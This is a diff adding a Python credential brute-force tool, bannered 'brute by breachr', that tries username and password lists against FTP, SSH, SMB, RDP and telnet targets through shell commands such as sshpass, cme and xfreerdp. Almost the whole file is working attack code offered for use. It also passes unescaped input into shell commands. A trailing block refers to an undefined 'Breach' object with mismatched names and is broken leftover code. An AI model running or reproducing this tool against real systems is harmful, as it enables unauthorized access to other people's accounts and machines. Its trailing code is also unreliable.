@@ -1,0 +1,164 @@
+#!/usr/bin/env python
+
+import os, time, argparse
+from subprocess import Popen, run, PIPE, STDOUT
+
+os.system("clear")
+print("""
+                    .:odxxddl:,.
+                  'lxOkol::;;,,,'.
+               ,xXWKOkOKXXXX0xl;.
+             .dNMMMMMWXOdooooddxdc;.
+            ,OWMMWXkl;.           ..
+           cXMWKd:.
+         .oNMWk'                         ..
+        .dNMWx.                          'd:
+       .xWMWx.                           .xK;
+      .dWMWk.                             dW0,
+      :XMMK;   .                     .    dWMO
+      :XMM0'  .oo'....';:;,'.......'c;   .xMWk
+      .oNMX;  .dNNK0KXNWMk:'...'',,...   ,KMO'
+       .oNWd.  'OWMMMMMMMx,.            .dWO'
+         cKK;   ,0MMMMMMMx,.            cKk'
+          ,Ox'   ;0MMMMMMx,.          .:Od.
+           .okd,  ;KMMMMMx'.        .oOkc
+             :O0:  ,xKWMWd..       .xKx'     brute
+              .ckl.  .,:c'        ,xx,       by breachr
+                .::.            .;c,
+                
+""")
+
+def cmd(commando):
+  run(commando, shell=True, executable="/bin/bash", stderr=STDOUT, timeout=10)
+  
+def atk_svc(module,target,user,passw):
+  print(F"Testing: {user}   {passw}   {target}")
+  if module == "ftp":
+    cmd(F"curl -P - -k 'ftp://{target}:21/' --user '{user}:{passw}'")
+  elif module == "ssh":
+    # p = Popen(F"ssh {user}@{target}".encode(), shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)
+    cmd(F"sshpass -p {passw} ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss {user}@{target}")  
+  elif module == "smb":
+    cmd(F"cme smb {target} -u {user} -p {passw}")
+  elif module == "rdp":
+    cmd(F"xfreerdp /cert:ignore /u:{user} /p:{passw} /v:{target}")
+  elif module == "telnet":
+    cmd(F"(sleep 2;echo {user};sleep 2;echo {passw};sleep 2;echo whoami;sleep 2;) | telnet {target}")
+  elif module == "winrm":
+    print("TODO")
+  else:
+    print("No module found for: " + module)
+    exit(1)
+
+def parse_file(target):
+  targets = []
+  with open(target, "r") as fil:
+    for lin in fil.readlines():
+      targets.append(lin.strip())
+  return targets
+
+def parse_input(a):
+  ''' Get input and transform to List '''
+  print("Parsing target list")
+  if os.path.isfile(a.target):
+    a.target = parse_file(a.target)
+  else:
+    a.target = [a.target]
+    
+  if a.combo:
+    print("Parsing combo list")
+    a.usr = []
+    a.passw = []
+    with open(a.combo, 'r') as fil:
+      for line in fil:
+        x = line.split(":")
+        a.usr.append(x[0].strip())
+        a.passw.append(x[1].strip())
+  else:
+    print("Parsing user list")
+    if os.path.isfile(a.usr):
+      a.usr = parse_file(a.usr)
+    else:
+      a.usr = [a.usr]
+    print("Parsing password list")
+    if os.path.isfile(a.passw):
+      a.passw = parse_file(a.passw)
+    else:
+      a.passw = [a.passw]
+
+class Bcolors:
+  OKGREEN = '\033[92m'
+  OKCYAN = '\033[96m'
+  ENDC = '\033[0m'
+  RED = '\033[91m'
+  OKBLUE = '\033[94m'
+  HEADER = '\033[95m'
+  FAIL = '\033[91m'
+  BOLD = '\033[1m'
+  UNDERLINE = '\033[4m'
+
+if __name__ == '__main__':
+  parser = argparse.ArgumentParser(description='Breach them.')
+  parser.add_argument('module', action='store', help='breachtype: e.g. ip smb ftp etc..')
+  parser.add_argument('target', action='store', help='breachtarget: IP, CIDR, URL, Domain or File.')
+  parser.add_argument('-c', '--combo', action='store', default=None, help='Username:Password Combo from file')
+  parser.add_argument('-u', '--usr', action='store', default=None, help='Username to use > can be a file')
+  parser.add_argument('-p', '--passw', action='store', default=None, help='Password to use > can be a file')
+  parser.add_argument('-s', '--sleep', action='store', default=0, type=int, help='Sleep between attempts')
+  parser.add_argument('-b', '--brute', action='store_true', default=False, help='True brute force > test all combinations')
+  a = parser.parse_args()
+  parse_input(a)
+  print("#" * 40)
+  
+  if a.brute:
+    print("Starting BRUTE FORCE > ALL COMBINATIONS")
+    for passw in a.passw:
+      for target in a.target:
+        for usr in a.usr:
+          atk_svc(a.module, target, usr, passw)
+          time.sleep(a.sleep)
+  else:
+    if not len(a.usr) == len(a.passw):
+      print("usr and passw not same length.. check files!")
+      exit(1)
+    for target in a.target:
+      for i in range(len(a.passw)):
+        usr = a.usr[i]
+        passw = a.passw[i]
+        atk_svc(a.module, target, usr, passw)
+        time.sleep(a.sleep)
+        
+        
+        
+        
+        
+        
+        
+        
+# Parse Brute Force Info
+    if Breach.brute:
+      if (not Breach.usr or not Breach.password) and (not Breach.combo):
+        print("User / Password / Combo not specified.. exit")
+        exit(1)
+      if Breach.combo:
+        if os.path.isfile(Breach.combo):
+          Breach.combo = Breach.parse_file(Breach.combo)
+        print("Parsing combo list")
+        Breach.usr = []
+        Breach.password = []
+        for lin in Breach.combo:
+          x = lin.split(":")
+          Breach.usr.append(x[0].strip())
+          Breach.passw.append(x[1].strip())    
+      else:
+        if os.path.isfile(Breach.usr):
+          Breach.usr = Breach.parse_file(Breach.usr)
+        else:
+          Breach.usr = [Breach.usr]
+        if os.path.isfile(Breach.password):
+          Breach.password = Breach.parse_file(Breach.password)
+        else:
+          Breach.password = [Breach.password]
+        if (not len(Breach.usr) == len(Breach.password)) and (len(Breach.usr) > 1 and len(Breach.password) > 1) and not Breach.allc :
+          print("usr and passw not same length.. check files!")
+          exit(1)
